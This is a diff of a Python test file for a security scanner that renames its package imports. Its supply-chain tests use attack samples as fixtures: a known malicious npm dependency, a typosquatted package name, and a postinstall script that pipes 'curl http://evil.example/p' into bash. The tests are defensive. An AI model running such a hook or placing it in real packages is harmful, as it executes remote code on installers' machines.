@@ -6,16 +6,16 @@ import json
 from datetime import datetime, timezone
 from pathlib import Path
 
-from argus.analysis.diff_scan import (
+from nephilex.analysis.diff_scan import (
     DiffScope,
     filter_findings,
     finding_in_diff,
     resolve_diff,
 )
-from argus.core.models import Finding, Location, Severity
-from argus.core.project import Project
-from argus.policy.engine import evaluate
-from argus.sbom.cyclonedx import build_cyclonedx
+from nephilex.core.models import Finding, Location, Severity
+from nephilex.core.project import Project
+from nephilex.policy.engine import evaluate
+from nephilex.sbom.cyclonedx import build_cyclonedx
 
 
 def _finding(rule, path="app.py", line=10, scanner="patterns"):
@@ -111,7 +111,7 @@ def test_policy_blocks_on_severity():
 
 
 def test_policy_scanner_match():
-    from argus.core.models import ScanResult
+    from nephilex.core.models import ScanResult
 
     result = ScanResult(target="t", started_at=datetime.now(timezone.utc))
     result.add(_finding("s", scanner="secrets"))
@@ -123,9 +123,9 @@ def test_policy_scanner_match():
 
 # --- supply-chain scanner --------------------------------------------------
 def test_supply_chain_flags_known_malicious(tmp_path: Path):
-    from argus.core.config import Config
-    from argus.core.plugin import ScannerContext
-    from argus.scanners.supply_chain import SupplyChainScanner
+    from nephilex.core.config import Config
+    from nephilex.core.plugin import ScannerContext
+    from nephilex.scanners.supply_chain import SupplyChainScanner
 
     (tmp_path / "package.json").write_text(
         json.dumps({"dependencies": {"flatmap-stream": "0.1.0"}}),
@@ -137,9 +137,9 @@ def test_supply_chain_flags_known_malicious(tmp_path: Path):
 
 
 def test_supply_chain_typosquat(tmp_path: Path):
-    from argus.core.config import Config
-    from argus.core.plugin import ScannerContext
-    from argus.scanners.supply_chain import SupplyChainScanner
+    from nephilex.core.config import Config
+    from nephilex.core.plugin import ScannerContext
+    from nephilex.scanners.supply_chain import SupplyChainScanner
 
     (tmp_path / "requirements.txt").write_text("requestss==1.0.0\n", encoding="utf-8")
     ctx = ScannerContext(project=Project.from_path(tmp_path), config=Config())
@@ -148,9 +148,9 @@ def test_supply_chain_typosquat(tmp_path: Path):
 
 
 def test_supply_chain_suspicious_npm_script(tmp_path: Path):
-    from argus.core.config import Config
-    from argus.core.plugin import ScannerContext
-    from argus.scanners.supply_chain import SupplyChainScanner
+    from nephilex.core.config import Config
+    from nephilex.core.plugin import ScannerContext
+    from nephilex.scanners.supply_chain import SupplyChainScanner
 
     (tmp_path / "package.json").write_text(
         json.dumps({"scripts": {"postinstall": "curl http://evil.example/p | bash"}}),
